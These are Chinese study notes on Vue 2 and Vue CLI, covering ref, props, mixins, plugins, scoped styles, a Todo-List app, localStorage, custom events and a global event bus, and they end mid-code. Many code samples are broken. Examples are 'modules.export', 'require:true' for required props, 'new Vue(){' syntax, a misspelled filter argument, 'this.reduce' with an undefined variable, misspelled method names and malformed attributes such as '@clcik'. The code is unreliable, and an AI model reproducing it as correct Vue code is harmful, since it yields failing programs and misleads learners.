使用vue.config.js可以对脚手架进行个性化定制，和package.json同级目录，详见 [配置参考 | Vue CLI](https://cli.vuejs.org/zh/config/#vue-config-js)

~~~js
modules.export={
  pages:{
    index:{
      entry:'src/index/main.js'  //入口
    }
  },
  lineOnsave:false  //关闭语法检查
}
~~~

# Vue CLI  ref props mixin plugin scoped

## ref属性

==ref==被用来给元素或子组件注册引用信息（id的替代者）

- 应用在==html== 标签上获取的是真实==DOM元素==，应用在组件标签上获取的是组件实例对象
- 使用方式
  - 打标识： ==<h1 ref="xxx"></h1>== 或者 ==<School ref="xxx"></School>==
  - 获取：==this.$refs.xxx==

~~~vue
<template>
	<div>
    <h1 v-text="msg" ref="title"></h1>
    <button ref="btn" @click="showBtn">点我输出上方的DOM元素</button>
    <School ref="sch"></School>
  </div>
</template>
<script>
	import School from './components/School'
  export default {
    new Vue({
    name:'App',
    components:{School},
    data(){
      return{
        msg:"欢迎学习Vue"
      }
    },
    methods:{
      showDom(){
        console.log(this.$refs.title)
        console.log(this.$refs.btn)
        console.log(this.$refs.sch)
      }
    }
  })
  }
</script>
~~~

![image-20230715133845693](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715141609820.png)

## props配置项

==props==让组件接收外部传过来的数据

- ​	传递数据==<Demo name="xxx" :age="18"/>== 这里age前加==：==，通过v-bind使得里面的18是数字
- 接收数据
  - 第一张方式(只接收) ==props:[‘name’,‘age’]== 
  - 第二种方式（限制类型） ==props:{name:String， age:Number}==
  - 第三种方式（限制类型、限制必要性、指定默认值）

~~~js
props:{
  name:{
    type:String,
    require:true,
    default:'Lyy'
  }
}
~~~

> 备注：`props是只读的` ，``Vue`底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制  `props` 的内容到  `data` 中，然后去修改  `data`  中的数据

`src/App.vue`

~~~Vue
<template>
	<div>
    <Student name="李四" sex="女" :age="18"></Student>
    <Student name="王五" sex="男" :age="19"></Student>
  </div>
</template>
<script>
	import Student from './components/Student.vue'
  export default {
   	name:'App',
    components:{Student}
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div>
    <h1>{{msg}}</h1>
    <h1>学生姓名：{{name}}</h1>
    <h1>学生性别：{{sex}}</h1>
    <h1>学生年龄：{{myAge+1}}</h1>
    <button @click="updateAge">尝试修改收到的年龄</button>
  </div>
</template>
<script>
	export default{
    name:'Student',
    data(){
      return {
        msg:"我是一个学生",
        myAge:this.age
      }
    },
    methods:{updateAge(){this.myAge++}},
    // 简单生命接收
    props:['name','age','sex'],
    
    //接收的同时对数据进行类型限制+必要性限制+默认值指定
    props:{
      name:{
        type:String,
        require:true
      },
      age:{
        type:Number,
        default:99
      },
      sex:{
        type:String,
        require:true
      }
    }
  }
</script>
~~~

![image-20230715140320954](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715144306509.png)

## mixin  混入

1. ==功能：可以把多个组件工用的配置提取成一个混入对象==

2. 使用方式

   - 定义混入

   ~~~js
   const mixin = {
     data() {...},
     methods:{...}
     ...
   }
   ~~~

   - 使用混入
     - 全局混入`Vue.mixin(){xxx}`
     - 局部混入`mixin:['xxx']`

==备注==：

1. 组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”，在发生冲突时，以组件优先

~~~js
var mixin = {
  data:function(){
    return {
      message:'hello',
      foo:'abc'
    }
  }
}
new Vue({
  mixins:[mixin],
  data(){
    return {
      message:'goodbye',
      bar:'def'
    }
  },
  created(){
    console.log('this.$date')
  }
})
~~~

![image-20230715141609820](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715150232148.png)

2. 同名生命周期钩子将合并为一个数组，==因此都将被调用==。另外，混入对象的钩子将在组件自身钩子之前调用

   > 意思就是如果混入对象的生命周期钩子和组件的生命周期钩子同名，他们两个将合并成一个数组，
   >
   > 先运行混入对象的生命周期钩子，然后运行组建的生命周期钩子

~~~js
var mixin={
	created(){
    console.log('混入对象的钩子被调用')
  }
}
new Vue({
  mixins:[mixin],
  created(){
    console.log('组件钩子被调用')
  }
})
~~~





`src/mixin.js`

~~~js
export const hunhe = {
  methods:{
    showName(){
      alert(this.name)
    }
  },
  mounted(){
    console.log('你好啊!')
  }
}
export const hunhe2 = {
	data(){
    return {
      x:100,
      y:200
    }
  }
}
~~~

`src/components/School.vue`

~~~vue
<template>
	<div>
    <h2 @click="showName">学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
  </div>
</template>
<script>
	import {hunhe,hunhe2} from '../mixin'
  export default {
    name:'School',
    data(){
      return {
        name:'尚硅谷',
        address:"bj",
        x:666
      }
    },
    mixins:[hunhe,hunhe2]  // 局部混入
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div>
    <h2 @click="showName">学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
  </div>
</template>
<script>
	import {hunhe,hunhe2} from '../mixin.js'
  export default{
    name:'Student',
    data(){
      return {
        name:'张三',
        sex:"男"
      }
    },
   mixins:[hunhe,hunhe2]
  }
</script>
~~~

`src/App.vue`

~~~vue
<template>
	<div>
    <School/>
    <hr>
    <Student/>
  </div>
</template>
<script>
	import Student from './components/Student.vue'
  import School from './components/School.vue'
  export default{
    name:'App',
    components:{Student,School}
  }
</script>
~~~

`src/main.js`

~~~js
import Vue from 'vue'
import App from './App.vue'
//import {mixin} from './mixin.js'

Vue.config.productionTip = false
// Vue.mixin(hunhe)
// Vue.mixin(hunhe2)

new Vue({
  el:"#root",
  render:h=>h(app)
})
~~~

![image-20230715144306509](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715160422136.png)

## plugin插件

1. 功能：用于增强Vue
2. 本质：包含`install`方法的一个对象，`install`的第一个参数是Vue，第二个以后的参数时插件使用者传递的数据
3. 定义插件（见下方src/plugin.js）
4. 使用插件Vue.use()

​	`src/plugins.js`	

```javascript
export default {
  install(Vue,x,y,z){
    console.log(x,y,z)
    //全局过滤器
    Vue.filter('mySlice',function(vulue){return value.splice(0,4)})
  
  	//定义全局指令
  	Vue.directive('fbind',{
  		//指令与元素成功绑定
  		bind(element,binding){element.value = binding.value},
			//指令所在元素插入页面时
			inserted(element,binding){element.focus()},
			//指令所在模块重新解析时
			update(element,binding){element.value=binding.value}
		})
    
    //定义混入
    Vue.mixin({
      data(){return {x:100,y:200}}
    })

		//给Vue原型上添加一个方法（vm和vc旧都能用了）
		Vue.prototype.hello = ()=>{alert('你好啊')}
  }
}
```

`src/main.js`

~~~js
import Vue from 'vue'
import App from './App.vue'
import plugins from './plugins.js'

Vue.config.productionTip = false
Vue.use(plugins,1,2,3) // 应用插件

new Vue(){
  el:'#app',
  render:h=>h(App)
}
~~~

`src/components/School.vue`

~~~vue
<template>
  <div>
    <h2>学校名称：{{ name | mySlice }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="test">点我测试一个hello方法</button>
  </div>
</template>

<script>
  export default {
    name:'School',
    data() {
      return {
        name:'尚硅谷atguigu',
        address:'北京',
      }
    },
    methods: {
      test(){
        this.hello()
      }
    },
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
  <div>
    <h2>学生姓名：{{ name }}</h2>
    <h2>学生性别：{{ sex }}</h2>
    <input type="text" v-fbind:value="name">
  </div>
</template>

<script>
  export default {
    name:'Student',
    data() {
      return {
        name:'张三',
        sex:'男'
      }
    },
  }
</script>
~~~

![image-20230715150232148](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//1643034116880-0c7ffd4b-f0ed-47b2-9638-3bb71344c4f1.png)

## scoped样式

1. 作用：让样式在局部生效，防止冲突

2. 写法：``<style scoped>``

   > ​	`vue`中的`webpack`并没有安装最新版，导致有些插件也不能默认安装最新版，如npm i less-loader@7 而不是最新版

   `src/components/School.vue`

   ~~~vue
   <template>
     <div class="demo">
       <h2 class="title">学校名称：{{ name }}</h2>
       <h2>学校地址：{{ address }}</h2>
     </div>
   </template>
   
   <script>
     export default {
       name:'School',
       data() {
         return {
           name:'尚硅谷atguigu',
           address:'北京',
         }
       }
     }
   </script>
   
   <style scoped>
     .demo{
       background-color: skyblue;
     }
   </style>
   ~~~

   `src/components/Student.vue`

   ~~~vue
   <template>
     <div class="demo">
       <h2 class="title">学生姓名：{{ name }}</h2>
       <h2 class="atguigu">学生性别：{{ sex }}</h2>
     </div>
   </template>
   
   <script>
     export default {
       name: 'Student',
       data() {
         return {
           name: '张三',
           sex: '男'
         }
       }
     }
   </script>
   
   <style lang="less" scoped>
     .demo {
       background-color: pink;
       .atguigu {
         font-size: 40px;
       }
     }
   </style>
   ~~~

   `src/App.vue`

   ~~~vue
   <template>
     <div>
       <h1 class="title">你好啊</h1>
       <School/>
       <Student/>
     </div>
   </template>
   
   <script>
     import Student from './components/Student'
     import School from './components/School'
   
     export default {
       name: 'App',
       components: { School, Student }
     }
   </script>
   
   <style scoped>
     .title {
       color: red;
     }
   </style>
   ~~~


# VueCLI Todo-List案例

## 组件化编码流程

1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突

2. 实现动态组件：考虑好数据的存放位置，数据时一个组件在用，还是一些组件再用

   - 一个组件再用：放在组件自身即可
   - 一些组件在用：放在他们共同的父组件上(==状态提示==)

3. 实现交互：从绑定事件开始

   `props`适用于

   1. 父组件==>子组件通信
   2. 子组件==>父组件通信 （要求父组件先给子组件一个函数）

​	使用`v-model`时要切记：`v-model`绑定的值不能是`props`传来的值，因为`props`是不可以修改的只读的

​	`props`传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做

> ​	以下代码引用了bootstrap，记得引用bootstrap

`src/App.vue`

~~~vue
<template>
	<div id="root">
    <div class="todo-container">
      <div class="todo-warp">
        <MyHeader :addTodo="addTodo"/>
        <MyList :todos="todos" :checkTodo="checkTodo" :deleTodo="deleteTodo"/>
        <MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
  		</div>
  	</div>
  </div>
</template>
<script>
	import MyHeader from './components/MyHeader'
  import MyList from './components/MyList'
  import MyFooter from './components/MyFooter'
  export default {
    name:'App',
    components:{MyHeader,MyList,MyFooter},
    data(){
      return {
        // 由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
        todos:[
          {id:'001',title:'抽烟',done:true},
          {id:'002',title:'喝酒',done:false},
          {id:'003',title:'开车',done:true}
        ]
      }
    },
    methods:{
      //添加
      addTodo(todoObj){
        this.todos.unshift(todoObj)
      },
      //勾选or取消勾选一个todo
      checkTodo(id){
        this.todos.forEach((todo)=>{
          if(todo.id===id) todo.done=!todo.done
        })
      },
      //删除一个todo
      deleteTodo(id){
        this.todos=this.todos.filter(todo=>todo.id!=id)
      },
      //全选or取消全选
      checkAllTodo(done){
        this.todos.forEach((todo)=>{
          todo.done=done
        })
      },
      //清除所有已经完成的todo
      clearAllTodo(){
        this.todos=this.todos.filter((todo)=>{
          return !todo.done
        })
      }
    }
  }
</script>
<style>
  /*base*/
  body {background: #fff;}
  .btn {display: inline-block;padding: 4px 12px;margin-bottom: 0;font-size: 14px;
    line-height: 20px;text-align: center;vertical-align: middle;cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;}
  .btn-danger {color: #fff;background-color: #da4f49;border: 1px solid #bd362f;}
  .btn-danger:hover {color: #fff;background-color: #bd362f;}
  .btn:focus {outline: none;}
  .todo-container {width: 600px;margin: 0 auto;}
  .todo-container .todo-wrap {padding: 10px;border: 1px solid #ddd;border-radius: 5px;}
</style>
~~~

`src/components/MyHeader.vue`

~~~vue
<template>
	<div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车确认" v-model="title" @keyup.enter="add">
  </div>
</template>
<script>
	import {nanoid} from 'nanoid'
  export default{
    name:'MyHeader',
    props:['addTodo'],
    data(){
      return {
        title:''
      }
    },
    methods:{
      add(){
        //校验数据
        if(!this.title.trim()) return alert('输入不能为空')
        //将用户输入包装成一个todo对象
        const todoObj={id:nanoid(),title:this.title,done:false}
        // 通知App组件去添加一个todo对象
        this.addTodo(todoObj)
        //清空输入
        this.title=''
      }
    }
  }
</script>
<style scoped>
	/*header*/
	.todo-header input {width: 560px;height: 28px;font-size: 14px;
    border: 1px solid #ccc;border-radius: 4px;padding: 4px 7px;}
	.todo-header input:focus {outline: none;border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);}
</style>
~~~

`src/components/MyList.vue`

~~~vue
<template>
	<ul class="todo-main">
    <MyItem v-for="todoObj in todos" :key="todoObj.id" :todo="todoObj" :checkTodo="checkTodo" :deleteTodo></MyItem>
  </ul>
</template>
<script>
	import MyItem from './Myitem.vue'
  export default {
    name:'MyList',
    components:{MyItem},
    props:['todos','checkTodo','deleteTodo']
  }
</script>
<style scoped>
  /*main*/
  .todo-main {margin-left: 0px;border: 1px solid #ddd;border-radius: 2px;padding: 0px;}
  .todo-empty {height: 40px;line-height: 40px;border: 1px solid #ddd;
    border-radius: 2px;padding-left: 5px;margin-top: 10px;}
</style>
~~~

`src/components/MyItem.vue`

~~~vue
<template>
	<li>
    <label>
  <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props -->
      <!-- <input type="checkbox" v-model="todo.done"/> -->
      <input type="checkbox" v-model="todo.done">
      <span>{{todo.title}}</span>
  	</label>
    <button class="btn btn-dangeer" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>
<script>
	export default{
    name:'MyItem',
    props:['todo','checkTodo','deleteTodo'],
    methods:{
      //勾选or 取消勾选
      handleCheck(id){
        this.checkTodo(id)
      },
      //删除
      handleDelete(id){
       	if(confirm('确认删除吗？')){
          this.deleteTodo(id)
        }
      }
    }
  }
</script>
<style scoped>
  /*item*/
  li {list-style: none;height: 36px;line-height: 36px;padding: 0 5px;
    border-bottom: 1px solid #ddd;}
  li label {float: left;cursor: pointer;}
  li label li input {vertical-align:middle; margin-right:6px; position:relative;top: -1px;}
  li button {float: right;display: none;margin-top: 3px;}
  li:before {content: initial;}
  li:last-child {border-bottom: none;}
  li:hover{background-color: #ddd;}
  li:hover button{display: block;}
</style>
~~~

`src/components/MyFooter.vue`

~~~vue
<template>
	<div class="todo-footer" v-show="total">
    <label>
       <!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
      <input type="checkbox" v-model="isAll">
  	</label>
    <span>
  		<span>已完成{{doneTotal}}/全部{{total}}</span>
  	</span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>
<script>
	export default{
    name:'MyFooter',
    props:['todos','checkAllTodo','clearAllTodo'],
    computed:{
      //总数
      total(){
        return this.todos.length
      },
      //已完成数量
      doneTotal(){
        //此处使用reduce方法做条件统计
        return this.reduce((pre,todo)=>pro + (todo.done?1:0),0)
      },
      //控制全选框
      isAll:{
        get(){
          return this.doneTotal === this.total && this.total>0
        },
        // isAll被修改时set被调用
        set(value){
          this.checkAllToodo(value)
        }
      }
    },
    methods:{
       /* checkAll(e){
				this.checkAllTodo(e.target.checked)
			} */
      //清空所有已完成
      clearAll(){
        this.clearAllTodo()
      }
    }
  }
</script>
<style scoped>
  /*footer*/
  .todo-footer {height: 40px;line-height: 40px;padding-left: 6px;margin-top: 5px;}
  .todo-footer label {display: inline-block;margin-right: 20px;cursor: pointer;}
  .todo-footer label input {position: relative;top: -1px;vertical-align: middle;
    margin-right: 5px;}
  .todo-footer button {float: right;margin-top: 5px;}
</style>
~~~

![image-20230715160422136](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715173803819.png)

# Vue CLI 本地存储 自定义事件

## WebStorage（js本地存储）

存储内容大小一般为5MB左右(不同浏览器可能还不一样)

浏览器通过`Window.sessionStorage`和`window.localStorage`属性来实现本地存储机制

相关API

> ​	`xxxStorage.setItem('key', 'value')`该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值
>
> ​	`xxxStorage.getItem('key')`该方法接受一个键名作为参数，返回键名对应的值
>
> ​	`xxxStorage.removeItem('key')`该方法接受一个键名作为参数，并把该键名从存储中删除
>
> ​	`xxxStorage.clear()`该方法会清空存储中的所有数据

备注：

> `sessionStorage`存储的内容会随着浏览器窗口关闭消失
>
> `localStorage`存储的内容需要手动清除才会消除
>
> `xxxStorage.getItem(xxx)` 如果xxx对应的Value 获取不到，那么getItem()的返回值是`null`
>
> `JSON.parse(null)` 的结果依然是`null`

==localStorage==

~~~html
<h2>localStorage</h2>
<button onclick="saveDate()">点我保存数据</button><br/>
<button onclick="readDate()">点我读数据</button><br/>
<button onclick="deleteDate()">点我删除数据</button><br/>
<button onclick="deleteAllDate()">点我清空数据</button><br/>

<script>
  let person = {name:"JOJO",age:20}

  function saveDate(){
    localStorage.setItem('msg','localStorage')
    localStorage.setItem('person',JSON.stringify(person))
  }
  function readDate(){
    console.log(localStorage.getItem('msg'))
    const person = localStorage.getItem('person')
    console.log(JSON.parse(person))
  }
  function deleteDate(){
    localStorage.removeItem('msg')
    localStorage.removeItem('person')
  }
  function deleteAllDate(){
    localStorage.clear()
  }
</script>
~~~

==sessionStorage==

~~~html
<h2>sessionStorage</h2>
<button onclick="saveDate()">点我保存数据</button><br/>
<button onclick="readDate()">点我读数据</button><br/>
<button onclick="deleteDate()">点我删除数据</button><br/>
<button onclick="deleteAllDate()">点我清空数据</button><br/>

<script>
  let person = {name:"JOJO",age:20}

  function saveDate(){
    sessionStorage.setItem('msg','sessionStorage')
    sessionStorage.setItem('person',JSON.stringify(person))
  }
  function readDate(){
    console.log(sessionStorage.getItem('msg'))
    const person = sessionStorage.getItem('person')
    console.log(JSON.parse(person))
  }
  function deleteDate(){
    sessionStorage.removeItem('msg')
    sessionStorage.removeItem('person')
  }
  function deleteAllDate(){
    sessionStorage.clear()
  }
</script>
~~~

### 使用本地存储优化Todo-List

`src/App.vue`

~~~vue

<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader :addTodo="addTodo"/>
				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
				<MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
			</div>
		</div>
	</div>
</template>

<script>
	import MyHeader from './components/MyHeader'
	import MyList from './components/MyList'
	import MyFooter from './components/MyFooter.vue'

	export default {
		name:'App',
		components:{MyHeader,MyList,MyFooter},
		data() {
			return {
				// 🔴从本地存储中获得数据，null就创建空数组[]
				todos:JSON.parse(localStorage.getItem('todos')) || []
			}
		},
		methods: {
			//添加一个todo
			addTodo(todoObj){
				this.todos.unshift(todoObj)
			},
			//勾选or取消勾选一个todo
			checkTodo(id){
				this.todos.forEach((todo)=>{
					if(todo.id === id) todo.done = !todo.done
				})
			},
			//删除一个todo
			deleteTodo(id){
				this.todos = this.todos.filter( todo => todo.id !== id )
			},
			//全选or取消全选
			checkAllTodo(done){
				this.todos.forEach((todo)=>{
					todo.done = done
				})
			},
			//清除所有已经完成的todo
			clearAllTodo(){
				this.todos = this.todos.filter((todo)=>{
					return !todo.done
				})
			}
		},
    // 🔴数据发生改变就放到本地存储中，注意深度侦听，以及JSON转化为字符串
		watch: {
			todos:{
				deep:true,
				handler(value){
					localStorage.setItem('todos',JSON.stringify(value))
				}
			}
		},
	}
</script>
~~~

## 组件的自定义事件

1. 一种组件间通信的方式，适用于：**子组件===>父组件**

2. 使用场景：**子组件**想给**父组件**传送数据，那么就要在**父组件中给子组件绑定自定义事件**(事件的回调在A中)

3. 绑定自定义事件

   1. 第一种方式，在父组件中`<Demo @事件名=“方法”>或者<Demo v-on:事件名=“方法”>`

   2. 第二种方式：在负组件中`this.$refs.demo.$on('事件名',方法)`

      ~~~js
      <Demo ref="demo"/>
        ...
      mounted(){
        this.$ref.demo.$on('atguigu',this.test)
      }
      ~~~

      

   3. 若想让自定义事件只触发一次，可以使用**`once`**修饰符，或`$once`方法
   
   4. 触发自定义事件`this.$emit('事件名',函数)`
   
   5. 解绑自定义事件`this.$off('事件名')`
   
   6. 组件上可以绑定原生**DOM**事件需要使用`native`修饰符，`@click.native='show'`
   
      上面绑定自定义事件，即使绑定的是原生事件也被认为是自定义的，需要加`native`，加了后就将此事件给组件的根元素
   
   7. 注意：通过==`this.$refs.xxx.$on('事件名',回调函数)`==绑定自定义事件时，回调函数要么配置在methods中，要么用箭头函数，否则this指向会出问题

`src/App.vue`

~~~vue
<template>
	<div class="app">
    <h1>{{msg}},学生姓名是{{studentName}}</h1>
    <!--通过父组件给子组件传递函数类型的prop实现子给父传递数据-->
    <School :getSchoolName="getSchoolName"/>
    <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据(第一张写法，使用@或者v-on)-->
    <!--<School @atguigu="getSchoolName" @demo="m1"/> -->
   <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第二种写法，使用ref）-->
    <Student ref="student" @click.native="show"/><!-- 🔴native -->
  </div>
</template>
<script>
	import Student from './components/Student'
  import School from './components/School'
  
  export default{
    name:'App',
    components:{School,Student},
    data(){
      return {
        msg:'你好啊！',
        studentName:''
      }
    },
    methods:{
      getSchoolName(name){
        console.log('App收到了学校名',name)
      },
      getStudentName(name,...params){
        console.log('App收到了学生名',name,params)
      },
      m1(){
        console.log('demo事件被触发了！')
      },
      show(){
        alert(123)
      }
    },
    mounted(){
      this.$refs.Student.$on('atguigu',this.getStydebtBane)
    }
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>当前求和为：{{number}}</h2>
    <button @click="add">点我number++</button>
    <button @click="sendStudentName">把学生名给App</button>
    <button @clcik="unbind">解绑atguigu事件</button>
    <button @click=“death>销毁当前Student组件的实例(vc)</button>
  </div>
</template>
<script>
	export default{
    name:"Student",
    data(){
      return {
        name:'张三',
        sex:'男',
        number:0
      }
    },
    methods:{
      add(){
        console.log('add回调被调用了')
        this.number++
      },
      sendStudentName(){
        //触发Student组件实例身上的atguigu事件
        this.$emit('atguigu',this.name,666,888,999)
        // this.$emit('demo')
        // this.$emit('click')
      },
      unbind(){
        //解绑
        this.$off('atguigu') //解绑一个自定义事件
        // this.$off(['atguigu','demo'])   //解绑多个自定义事件
        // this.$off() //解绑所有的自定义事件
      },
      death(){
        //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全部不奏效
        this.$destroy()
      }
    }
  }
</script>
<style leng="less" scoped>
		.student{background-color: pink;padding: 5px;margin-top: 30px;}
</style>
~~~

## **使用自定义事件优化Todo-List**

`src/App.vue`

~~~vue
<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader @addTodo="addTodo"/>
				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
				<MyFooter :todos="todos" 
                  @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
			</div>
		</div>
	</div>
</template>

<script>
	import MyHeader from './components/MyHeader'
	import MyList from './components/MyList'
	import MyFooter from './components/MyFooter.vue'

	export default {
		name:'App',
		components:{MyHeader,MyList,MyFooter},
		data() {
			return {
				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
				todos:JSON.parse(localStorage.getItem('todos')) || []
			}
		},
		methods: {
			//添加一个todo
			addTodo(todoObj){
				this.todos.unshift(todoObj)
			},
			//勾选or取消勾选一个todo
			checkTodo(id){
				this.todos.forEach((todo)=>{
					if(todo.id === id) todo.done = !todo.done
				})
			},
			//删除一个todo
			deleteTodo(id){
				this.todos = this.todos.filter( todo => todo.id !== id )
			},
			//全选or取消全选
			checkAllTodo(done){
				this.todos.forEach((todo)=>{
					todo.done = done
				})
			},
			//清除所有已经完成的todo
			clearAllTodo(){
				this.todos = this.todos.filter((todo)=>{
					return !todo.done
				})
			}
		},
		watch: {
			todos:{
				deep:true,
				handler(value){
					localStorage.setItem('todos',JSON.stringify(value))
				}
			}
		},
	}
</script>
~~~

`src/components/MyHeader.vue`

~~~vue
<template>
	<div class="todo-header">
		<input type="text" placeholder="请输入你的任务名称，按回车键确认" 
           v-model="title" @keyup.enter="add"/>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'
	export default {
		name:'MyHeader',
		data() {
			return {
				title:''	// 收集用户输入的title
			}
		},
		methods: {
			add(){
				//校验数据
				if(!this.title.trim()) return alert('输入不能为空')
				//将用户的输入包装成一个todo对象
				const todoObj = {id:nanoid(),title:this.title,done:false}
				//通知App组件去添加一个todo对象
				this.$emit('addTodo',todoObj)
				//清空输入
				this.title = ''
			}
		},
	}
</script>
~~~

`src/components/MyFooter`

~~~vue
<template>
	<div class="todo-footer" v-show="total">
		<label>
			<!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
			<input type="checkbox" v-model="isAll"/>
		</label>
		<span>
			<span>已完成{{ doneTotal }}</span> / 全部{{ total }}
		</span>
		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
	</div>
</template>

<script>
	export default {
		name:'MyFooter',
		props:['todos'],
		computed: {
			//总数
			total(){
				return this.todos.length
			},
			//已完成数
			doneTotal(){
				return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
			},
			//控制全选框
			isAll:{
				//全选框是否勾选
				get(){
					return this.doneTotal === this.total && this.total > 0
				},
				//isAll被修改时set被调用
				set(value){
					// this.checkAllTodo(value)
					this.$emit('checkAllTodo',value)
				}
			}
		},
		methods: {
			//清空所有已完成
			clearAll(){
				// this.clearAllTodo()
				this.$emit('clearAllTodo')
			}
		},
	}
</script>
~~~

# Vue CLI 全局事件总线 消息的订阅与发布

## 全局事件总线（GlobalEventBus）

**一种可以在任意组件间通信的方式**，本质上是一个对象，它必须满足以下条件

1. 所有的组件对象都必须能看见它
2. 这个对象必须能够使用`$on``$emit` `$off` 方法去绑定、触发和解绑事件

### 使用步骤

1. 定义全局事件总线

   ~~~js
   new Vue({
   	...
   	beforeCreate(){
     	Vue.prototype.$bus=this
   	},
      ...
   })
   ~~~

2. 使用事件总线

   1. 接受数据：A组件想接收数据，则在A组件中给`$bus`绑定自定义事件，时间的回调留在A组件自身

      ~~~js
      export default{
        methods:{
          demo(data){...}
        },
          mounted(){
            this.$bus.$on('xxx',this.demo)
          }
      }
      ~~~

   2. 提供数据：`this.$bus.$emit('xxx',data)`

3. 最好在`beforeDestroy`钩子中，用`$off`去解绑当前组件所用到的事件

`src/main.js`

~~~js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
  el:'#app',
  render:h=>h(App)
  beforeCreate(){
  Vue.prototype.$bus=this //安装全局事件总线 
}
})
~~~

`src/App.vue`

~~~vue
<template>
	<div class="app">
    <School/>
    <Student/>	
  </div>
</template>
<script>
	import Student from './components/Student.vue'
  import School from './components/School.vue'
  
  export default{
    name:'App',
    components:{Student,School},
  }
</script>
<style scoped>
.app{background-color: gray;padding: 5px;}
</style>
~~~

`src/components/School.vue`

~~~vue
<template>
	<div class="school">
    <h2>学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
  </div>
</template>
<script>
	export default{
    name:'School',
    data(){
      return {
        name:'sgg',
        address:"hn"
      }
    },
    mounted(){
      this.$bus.$on('hello',(data)=>{
        console.log('我是School组件，我收到了数据',data)
      })
    },
    beforeDestroy(){
      this.$bus.$off('hello')
    }
  }
</script>
~~~

`src/components/Student.vue`

~~~vue
<template>
	<div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <button @click="sendStudentName">把学生名给School组件</button>
  </div>
</template>
<script>
	export default{
    name:'Student',
    data(){
      return {
        name:"张三",
        sex:"男"
      }
    },
    methods:{
      sendStudentName(){
        this.$bus.$emit('demo',this.name)
      }
    }
  }
</script>
<style scoped>.student{background-color: pink;padding: 5px;margin-top: 30px;}</style>
~~~

![image-20230715173803819](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715120026623.png)

### 使用自定义事件优化Todo-List

`src/mian.js`

~~~ js
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false

new Vue({
  el:'#app',
  render: h => h(App),
  beforeCreate() {
    Vue.prototype.$bus = this
  },
})
~~~

`src/App.vue`

~~~vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodo="addTodo" />
        <MyList :todos="todos"/>
        <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
    </div>
    </div>
  </div>
</template>

<script>
  import MyHeader from "./components/MyHeader";
  import MyList from "./components/MyList";
  import MyFooter from "./components/MyFooter.vue";

  export default {
    name: "App",
    components: { MyHeader, MyList, MyFooter },
    data() {
      return {
        //由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
        todos: JSON.parse(localStorage.getItem("todos")) || [],
      };
    },
    methods: {
      //添加一个todo
      addTodo(todoObj) {
        this.todos.unshift(todoObj);
      },
      //勾选or取消勾选一个todo
      checkTodo(id) {
        this.todos.forEach((todo) => {
          if (todo.id === id) todo.done = !todo.done;
        });
      },
      //删除一个todo
      deleteTodo(id) {
        this.todos = this.todos.filter((todo) => todo.id !== id);
      },
      //全选or取消全选
      checkAllTodo(done) {
        this.todos.forEach((todo) => {
          todo.done = done;
        });
      },
      //清除所有已经完成的todo
      clearAllTodo() {
        this.todos = this.todos.filter((todo) => {
          return !todo.done;
        });
      },
    },
    watch: {
      todos: {
        deep: true,
        handler(value) {
          localStorage.setItem("todos", JSON.stringify(value));
        },
      },
    },
    mounted() {
